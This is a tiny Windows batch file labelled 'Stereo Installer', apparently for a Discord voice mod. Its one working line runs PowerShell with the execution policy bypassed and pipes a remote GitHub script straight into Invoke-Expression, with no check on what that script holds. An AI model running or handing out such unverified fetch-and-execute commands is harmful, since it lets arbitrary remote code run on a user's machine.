@echo off
title Stereo Installer
echo Downloading latest Stereo Installer...
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/82s/voice-modules/main/DiscordVoiceFixer.ps1 | iex"
